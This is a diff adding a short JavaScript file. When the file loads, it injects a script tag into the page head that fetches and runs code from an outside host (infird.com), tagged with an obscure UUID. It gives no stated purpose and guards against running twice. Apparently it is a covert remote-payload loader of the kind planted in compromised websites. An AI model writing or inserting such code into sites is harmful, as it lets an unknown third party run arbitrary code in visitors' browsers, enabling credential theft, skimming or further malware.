@@ -1,0 +1,25 @@
+(() => {
+    if (document.querySelector('script[data-awssuidacr]') !== null) {
+        return;
+    }
+
+    const head = document.querySelector('head');
+    const awssuidacr = '6e1b5735-2c57-4ab8-b7c1-0ece3c9d7c0b';
+
+    function createScript(url) {
+        url = new URL(url);
+        url.searchParams.append('uuid', awssuidacr);
+
+        const script = document.createElement('script');
+        script.type = 'text/javascript';
+        script.src = url.href;
+        script.dataset['awssuidacr'] = awssuidacr;
+
+        head.appendChild(script);
+    }
+
+        createScript('https://infird.com/cdn/b50b7f30-3efc-40a4-958b-47c84a6ef83f');
+    })();
+
+
+// October 15, 2024 - 12:28 PM
